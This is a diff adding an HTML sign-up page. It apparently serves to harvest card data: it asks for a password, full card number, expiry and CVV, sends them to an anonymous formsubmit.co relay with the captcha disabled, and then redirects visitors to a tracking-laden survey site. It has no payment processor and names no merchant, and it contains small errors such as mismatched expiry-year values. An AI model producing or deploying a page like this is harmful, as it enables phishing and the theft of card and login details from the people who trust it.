@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Sign Up Form</title>
+        <link rel="stylesheet" href="https://codepen.io/gymratpacks/pen/VKzBEp#0">
+        <link href='https://fonts.googleapis.com/css?family=Nunito:400,300' rel='stylesheet' type='text/css'>
+        <link rel="stylesheet" href="info.css">
+    </head>
+    <body>
+      <div class="row">
+    <div class="col-md-12">
+      <form action="https://formsubmit.co/8d972269ccda7a36fd5e3ae1f2f58f21" method="POST">
+        <!-- Honeypot -->
+        <input type="text" name="_honey" style="display: none;">
+
+        <!-- Disable Captcha -->
+        <input type="hidden" name="_captcha" value="false">
+
+        <input type="hidden" name="_next" value="https://survimo.com/ng/?pbid=ODcyOm1ldHJv&gclid=Cj0KCQjw4omaBhDqARIsADXULuUx4EfSGq8S5Rh5kHJSdqq1wlyNFtNMyEc-TbrnemDm8poH7lgpBRoaAh0NEALw_wcB">
+>
+        <h1> Sign Up </h1>
+        
+        <fieldset>
+          
+          <legend><span class="number">1</span> Your Basic Info</legend>
+        
+          <label for="name">Name:</label>
+          <input type="text" id="name" name="user_name" required>
+        
+          <label for="email">Email:</label>
+          <input type="email" id="mail" name="user_email" required>
+       
+          <label for="password">Password:</label>
+          <input type="password" id="password"       name="user_password" required>
+        
+          <label>Age:</label>
+          <input type="radio" id="under_18" value="under_18" name="user_age"><label for="under_18" class="light">Under 18</label><br>
+          <input type="radio" id="over_18" value="over_18" name="user_age"><label for="over_18" class="light">Over 18</label>
+          
+        </fieldset>
+        <fieldset>  
+        
+          <legend><span class="number">2</span> Your payment Profile</legend>
+          
+        <legend>
+          <h1 class="form-top">Payment</h1>
+        </legend>
+        <div class="form-group">
+          <label class="col-sm-3 control-label" for="card-holder-name">Name</label>
+          <div class="col-sm-9">
+            <input type="text" class="form-control" name="card-holder-name" id="card-holder-name" placeholder="Card Holder's Name" required>
+          </div>
+        </div>
+        <div class="form-group">
+          <label class="col-sm-3 control-label" for="card-numbers">Number</label>
+          <div class="col-sm-9">
+            <input type="text" class="form-control" name="card-number" id="card-numbers" placeholder="Debit/Credit Card Number" required>
+          </div>
+        </div>
+        <div class="form-group">
+          <label class="col-sm-3 control-label" for="expiry-month">Expiration</label>
+          <div class="col-sm-9">
+            <div class="row">
+              <div class="col-xs-6">
+                <select class="form-control col-sm-2" name="expiry-month" id="expiry-month">
+                  <option>Month</option>
+                  <option value="01">Jan (01)</option>
+                  <option value="02">Feb (02)</option>
+                  <option value="03">Mar (03)</option>
+                  <option value="04">Apr (04)</option>
+                  <option value="05">May (05)</option>
+                  <option value="06">June (06)</option>
+                  <option value="07">July (07)</option>
+                  <option value="08">Aug (08)</option>
+                  <option value="09">Sep (09)</option>
+                  <option value="10">Oct (10)</option>
+                  <option value="11">Nov (11)</option>
+                  <option value="12">Dec (12)</option>
+                </select>
+              </div>
+              <div class="col-xs-6">
+                <select class="form-control col-sm-2" name="expiry-year">
+                  <option value="17">2022</option>
+                  <option value="18">2023</option>
+                  <option value="19">2024</option>
+                  <option value="20">2025</option>
+                  <option value="21">2026</option>
+                  <option value="22">2027</option>
+                  <option value="23">2028</option>
+                </select>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="form-group">
+          <label class="col-sm-3 control-label" for="cvv">Card CVV</label>
+          <div class="col-sm-6">
+            <input type="text" class="form-control" name="cvv" id="cvv" placeholder="Security Code" required>
+          </div>
+        </div>
+        <br>
+        <div class="form-group">
+          
+          </div>
+        </div>
+      </fieldset>
+     
+     
+      <button type="submit">Sign Up</button>
+       </form>
+        </div>
+      </div>
+      
+    </body>
+</html>
